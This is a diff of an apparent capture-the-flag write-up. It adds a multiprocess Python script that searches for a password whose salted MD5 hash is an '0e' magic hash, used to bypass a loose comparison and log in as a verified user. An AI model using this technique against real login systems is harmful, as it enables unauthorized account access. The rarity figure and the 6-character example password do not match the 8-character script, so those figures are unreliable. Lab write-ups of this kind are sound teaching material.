@@ -258,31 +258,35 @@ We know from the source that passwords are hashed as `md5(salt + password)`. We 
 md5("vunp" + P) matches /^0e[0-9]+$/
 ```
 
-A quick script does the job:
+This pattern is rare — roughly 1 in 10 billion MD5 hashes qualify — so sequential enumeration is impractical. The right approach is random sampling across multiple processes, since every guess is independent:
 
 ```python
-import hashlib
-import itertools
-import string
+import hashlib, random, string, multiprocessing, os
 
 salt = "vunp"
 charset = string.ascii_lowercase + string.digits
 
-for length in range(1, 8):
-    for combo in itertools.product(charset, repeat=length):
-        password = ''.join(combo)
+def worker(id):
+    attempts = 0
+    while True:
+        password = ''.join(random.choices(charset, k=8))
         h = hashlib.md5((salt + password).encode()).hexdigest()
+        attempts += 1
         if h.startswith("0e") and h[2:].isdigit():
             print(f"Found! password={password}  hash={h}")
-            exit()
+            os._exit(0)
+
+if __name__ == "__main__":
+    for i in range(8):
+        multiprocessing.Process(target=worker, args=(i,)).start()
 ```
 
-This finds a collision within seconds.
+With 8 workers this takes a few minutes. For example, password `514llh` produces hash `0e323733874908324083991036769039` — a match.
 
 ### Step 5: Log in
 
 - **Username:** `elephant`
-- **Password:** *(whatever your script found)*
+- **Password:** `514llh` *(or whatever your script found)*
 
 It works! And crucially, elephant is a **verified** user. The home page now shows a new section at the bottom that unverified users never see:
 
